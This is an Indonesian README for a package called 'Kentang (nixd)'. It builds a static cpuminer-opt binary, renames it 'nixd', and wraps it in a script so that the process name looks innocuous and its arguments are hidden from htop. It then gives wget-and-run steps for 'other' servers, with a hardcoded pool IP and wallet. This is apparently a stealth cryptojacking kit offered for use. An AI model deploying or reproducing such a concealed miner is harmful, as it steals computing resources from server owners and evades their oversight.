# Kentang (nixd)

Paket ini berisi:
- `nixd.sh` : script wrapper agar binary miner berjalan dengan nama proses `nixd` saja (argumen tidak terlihat di htop).
- `nixd` : binary hasil compile **cpuminer-opt** statis (tidak termasuk di sini, kamu harus compile sendiri lalu upload ke repo).

## Cara pakai

1. Compile cpuminer-opt statis di Ubuntu:
   ```bash
   sudo apt update
   sudo apt install -y build-essential automake autoconf libtool pkg-config git
   git clone https://github.com/JayDDee/cpuminer-opt.git
   cd cpuminer-opt
   ./build.sh CFLAGS="-O3" LDFLAGS="-static"
   mv cpuminer nixd
   ```

2. Upload file `nixd` ke GitHub bersamaan dengan `nixd.sh` ini.

3. Di server/VPS lain, download dan jalankan:
   ```bash
   wget https://github.com/USERNAME/kentang/raw/main/nixd
   wget https://github.com/USERNAME/kentang/raw/main/nixd.sh
   chmod +x nixd nixd.sh
   ./nixd.sh
   ```

## Konfigurasi default
- Algo: power2b
- Pool: 47.84.55.99:443
- Wallet: MevDnQVzEy3aLmQdpU52Tz6MyviwxCE3Er
- Threads: 1
